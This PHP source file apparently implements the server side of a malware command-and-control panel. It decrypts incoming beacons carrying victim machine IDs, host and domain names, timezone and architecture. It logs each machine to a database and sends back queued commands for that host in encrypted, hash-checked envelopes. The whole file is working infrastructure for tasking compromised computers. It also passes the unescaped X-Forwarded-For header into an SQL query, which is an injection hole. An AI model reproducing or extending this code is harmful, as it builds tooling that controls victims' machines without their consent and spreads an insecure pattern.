<?php
/*
	mod_parser.php
*/

require_once 'mod_crypt.php';

define('sizeof_CHUNK_SERIALIZATION_ENVELOPE', 4+4+20);
define('sizeof_INNER_ENVELOPE', 2+4+8+4+1+2+2+1+1+1+1+1+64+4+32+32);

define('ICF_PLATFORM_X64', 1 << 1);

/*
  	Prepares a list of all ips passed
*/
function GetAllIPs()
{

	$ips = array_merge(array($_SERVER['REMOTE_ADDR']), explode(",", $_SERVER['HTTP_X_FORWARDED_FOR']));
	array_walk($ips, 'trim');
	$ips = array_unique(array_filter($ips));

    return implode(',', $ips);
}



/*
    Translates hex string (len must be multiple of 2) byte order from reversed into direct
*/
function binhex_reverse($hexin)
{
    return strtoupper(bin2hex(strrev(pack("H*", $hexin))));
}


// converts db's enum from arch type field into numeric value according to SC_TARGET_ARCH enum
function archToInt($arch)
{
    switch($arch) {
    
        case 'unk': return 0;
        case 'x32': return 1;
        case 'x64': return 2;
        case 'all': return 3;
        
    } // switch

}

/*
    Searches and appends all pending jobs for specified mid
    To prevent dup parse, use context to store ids of already processed mid
*/
function mpJobsParser($id, &$answer, &$jobs_context)
{
    global $g_dblink;
    
    // check for already processed item
    if (in_array($id, $jobs_context)) { return; }
    
    // new id, save it to prevent re-check for the same id later
    $jobs_context[] = $id;
    
    // declare array of retrieved job ids, to use it later
    $jobs_received = array();

    // NB: there may be more than 1 job assigned, use special envelope when adding each job (SERVER_COMMAND struct)
    $res = mysqli_query($g_dblink, "SELECT `cmds_list`.`id`, `cmd_params`.`cmd_code`, `cmd_params`.`targ_arch`, `cmd_params`.`params`
                                    FROM `cmds_list`
                                    LEFT JOIN `cmd_params` ON `cmds_list`.`linked_cmd_params`=`cmd_params`.`id`
                                    WHERE 
                                    `cmds_list`.`target_id`={$id} AND 
                                    `cmds_list`.`is_done`=0 AND
                                    (`cmds_list`.`last_stamp`='0000-00-00 00:00:00' OR `cmds_list`.`last_stamp` < DATE_SUB(NOW(), INTERVAL 15 MINUTE));");
    while ($row = mysqli_fetch_assoc($res)) {
        
        // save id to set it's sent flag later for all at once
        $jobs_received[] = $row['id'];
    
        // add a container to $answer
        $answer .= pack('vVVC', $row['cmd_code'], strlen($row['params']), $row['id'], archToInt($row['targ_arch'])).$row['params'];
        unset($row);
        
    } // while $row
    
    // now form an query to update cmds_list.last_stamp for processed ids
    $jrec_in = implode(",", $jobs_received);
    mysqli_query($g_dblink, "UPDATE `cmds_list` SET `last_stamp`=NOW() WHERE `id` IN ({$jrec_in});");

}


/*
    Parses data from outer envelope using extra parsers
    Returns FALSE on any error
*/
function mpProceedChunk($data, &$answer, &$error, &$jobs_context)
{
    global $g_dblink;
    
    // null answer
    //$answer = '';
    
    // check len
    if (strlen($data) < sizeof_INNER_ENVELOPE) { $error = __FUNCTION__."(".__LINE__."): Basic len check failed for inner chunk, min expected ".strval(sizeof_INNER_ENVELOPE)." but found ".strval(strlen($data)); return FALSE; }
    
    // proceed generic INNER_ENVELOPE structure
    $iEnvelope = unpack("vwEnvelopeId/VdwDataLen/H16i64SourceMachineId/VdwTickCountStamp/CbContextFlags/vwBuildId/vwYear/CbMonth/CbDay/CbHour/CbMinute/CbSecond/a64wTZName/llBias/a32wcDomain/a32wcMachine", $data);

    // basic check len
    if ($iEnvelope['dwDataLen'] > strlen($data)) { $error = __FUNCTION__."(".__LINE__."): Len check failed for inner chunk, max expected ".strval(strlen($data))." but found ".strval($iEnvelope['dwDataLen']); return FALSE; }

    // byte-reverse hex fields to convert from binary position into correct hex representation
    $iEnvelope['i64SourceMachineId'] = binhex_reverse($iEnvelope['i64SourceMachineId']);


    //echo $data;
    //print_r($iEnvelope);

    // prepare values for insertion
    $mid = mysqli_real_escape_string($g_dblink, $iEnvelope['i64SourceMachineId']);
    $m_name = mysqli_real_escape_string($g_dblink, $iEnvelope['wcMachine']);
    $d_name = mysqli_real_escape_string($g_dblink, $iEnvelope['wcDomain']);
    $l_ticks = strval(intval($iEnvelope['dwTickCountStamp']));
    $tz_name = mysqli_real_escape_string($g_dblink, $iEnvelope['wTZName']);
    $tz_bias = strval(intval($iEnvelope['lBias']));
    $v_build = strval(intval($iEnvelope['wBuildId']));
    $c_flags = strval(intval($iEnvelope['bContextFlags']));

    $rdate = sprintf("%04u-%02u-%02u %02u:%02u:%02u",$iEnvelope['wYear'], $iEnvelope['bMonth'], $iEnvelope['bDay'], $iEnvelope['bHour'], $iEnvelope['bMinute'], $iEnvelope['bSecond']);

    $ips = GetAllIPs();
    
    // need to extract platform flag into special field
    if (($iEnvelope['bContextFlags'] & ICF_PLATFORM_X64)==ICF_PLATFORM_X64) { $arch = 'x64'; } else { $arch = 'x32'; }

    // update basic info table
    mysqli_query($g_dblink, "INSERT INTO `cli` (`stamp`, `mid`, `ip`, `l_ticks`, `l_ft`, `tz_name`, `tz_bias`, `m_name`, `d_name`, `arch`, `v_build`, `c_flags`) VALUES (NOW(), '{$mid}', '{$ips}', {$l_ticks}, '{$rdate}', '{$tz_name}', {$tz_bias}, '{$m_name}', '{$d_name}', '{$arch}', {$v_build}, {$c_flags})
                             ON DUPLICATE KEY UPDATE `dummy`=NOT(`dummy`), `ip`='{$ips}', `l_ticks`={$l_ticks}, `l_ft`='{$rdate}', `tz_name`='{$tz_name}', `tz_bias`={$tz_bias}, `m_name`='{$m_name}', `d_name`='{$d_name}', `arch`='{$arch}', `v_build`={$v_build}, `c_flags`={$c_flags};");

    // store id to be used by packet processors later
    $id = mysqli_insert_id($g_dblink);

    //echo "insert id={$id}";

    // prepare appended data for parser
    $mod_data = substr($data, sizeof_INNER_ENVELOPE);

    // call module-specific workers
    $mod_name = sprintf("./inc/parser_%04u.php", $iEnvelope['wEnvelopeId']);
    $FuncName = sprintf("Parser_id%04u", $iEnvelope['wEnvelopeId']);

    if (!file_exists($mod_name)) { $error = __FUNCTION__."(".__LINE__."): Parser module {$mod_name} not found"; return FALSE; }

    require_once $mod_name;

    if (!function_exists($FuncName)) { $error = __FUNCTION__."(".__LINE__."): Parser function {$FuncName} not found in module {$mod_name} not found"; return FALSE; }

    // function result to supply to caller
    $bRes = TRUE;
    
    // define special envelope ids, which needs to modify $answer internally
    $arSpecialIds = array(4, 6);
    if (in_array($iEnvelope['wEnvelopeId'], $arSpecialIds, TRUE)) {
        
        // special case - parser function will return ready data to be sent
        $bRes = $FuncName($id, $mod_data, $error, $answer);
        
    } else {
        
        // simple chunks, first parse, when check for jobs
        
        // call incoming data parser
        $bRes = $FuncName($id, $mod_data, $error);

        // query any command linked to this mid
        // use $jobs_context passed to call job parser
        mpJobsParser($id, $answer, $jobs_context);

    }  
    
    // all done ok
    return $bRes;
}


/*
    Prepares a correct envelope for a particular answer
*/
function mpMakeEnvelope($data)
{
    $dwRandom = mt_rand(0, 0xFFFF0000);

    // chunk with hash nulled, to calculate a correct hash
    $nulled_chunk = pack("VVa20", $dwRandom, strlen($data), chr(0)).$data;
    $hash = sha1($nulled_chunk, TRUE); unset($nulled_chunk);

    return pack("VVa20", $dwRandom, strlen($data), $hash).$data;
}

// checks if first item in passed chunks buffer is valid
function mpIsValidChunk($raw, &$error, &$this_chunk_datalen)
{
    
    if (strlen($raw) < sizeof_CHUNK_SERIALIZATION_ENVELOPE) { $error = __FUNCTION__."(".__LINE__."): Len check failure, found ".strval(strlen($raw)).", min expected ".strval(sizeof_CHUNK_SERIALIZATION_ENVELOPE); return FALSE; }
    
    // parse as a group of chunks
    $sheader = unpack("VdwRandom/VdwDataLen/a20bChunkHash", $raw);
    
    // re-define $sheader['bChunkHash'] as cut of $raw, because usage of a20 (nul-padded string) will lead to failures when hash has nulls on it's end
    $sheader['bChunkHash'] = substr($raw, 4+4, 20);

    // basic checks
    if ($sheader['dwDataLen'] > strlen($raw)) { $error = __FUNCTION__."(".__LINE__."): Len check failure, found ".strval($sheader['dwDataLen']).", max expected ".strval(strlen($raw)); return FALSE; }

    // copy single chunk's contents, and re-create a null hash for it
    $data = substr($raw, sizeof_CHUNK_SERIALIZATION_ENVELOPE, $sheader['dwDataLen']);
    $single_chunk_bin = pack("VVa20", $sheader['dwRandom'], $sheader['dwDataLen'], chr(0)).$data;
    unset($data);

    // calc hash
    $calc_hash = sha1($single_chunk_bin, TRUE);
    if ($sheader['bChunkHash'] != $calc_hash) { $error = __FUNCTION__."(".__LINE__."): Chunk hash invalid, expected ".bin2hex($calc_hash).", found ".bin2hex($sheader['bChunkHash']); return FALSE; }

    // all seems to be ok
    $this_chunk_datalen = $sheader['dwDataLen'];
    unset($sheader);
    return TRUE;
}

/*
    Parses raw stream from inpCheckParse(), returns encrypted binary answer 
    to be output directly or as an attachment to some envelope
    Returns FALSE on any error
*/
function inpCheckParseStream($raw_stream, &$error, &$bin_answer)
{
	// perform overlay decryption over input
	$raw = cryptDecrypt($raw_stream);
    if ($raw === FALSE) { $error = __FUNCTION__."(".__LINE__."): decrypt fail"; return FALSE; }

    // resulting binanswer
    $bin_answer = '';
    
    // jobs context to prevent sending a copy of job when there is more than 1 chunk from the same mid
    // used internally by jobs manager.
    $jobs_context = array();

    while (strlen($raw)>0) {

        // parse as a group of chunks, validate from the first one
        $appended_data_len = 0;
        if (!mpIsValidChunk($raw, $error, $appended_data_len)) { $error.=", mpIsValidChunk() failed"; return FALSE; }
        
        // call generic answer processor
        $answer = '';
        $data = substr($raw, sizeof_CHUNK_SERIALIZATION_ENVELOPE, $appended_data_len);
        if (!mpProceedChunk($data, $answer, $error, $jobs_context)) { $error.=", mpProceedChunk() failed"; return FALSE; }
        unset($data);

        // add binanswer
        $bin_answer .= mpMakeEnvelope($answer);
        unset($answer);

        // cut processed part
        $raw = substr($raw, sizeof_CHUNK_SERIALIZATION_ENVELOPE + $appended_data_len);

    } // while $raw

    // encrypt answer resulted in $bin_answer
    $bin_answer = cryptEncrypt($bin_answer);
    
    unset($jobs_context);
    
    // all ok if got here
    return TRUE;

}


/*
  	Main parser function
*/
function inpCheckParse(&$error)
{
	// check for POST
 	if(@$_SERVER['REQUEST_METHOD'] !== 'POST') { return FALSE; }

	// get raw data
	$raw = @file_get_contents('php://input');
	if ($raw=='') {
		$keys = array_keys($_POST);
		$raw = $_POST[$keys[0]];
	} // empty raw

    // resulting binanswer
    $bin_answer = '';

    if (!inpCheckParseStream($raw, $error, $bin_answer)) { return FALSE; }
    
    // every item was parsed, prepare answer and send to caller
    echo $bin_answer;

	// all ok if got here
 	return TRUE;
}

?>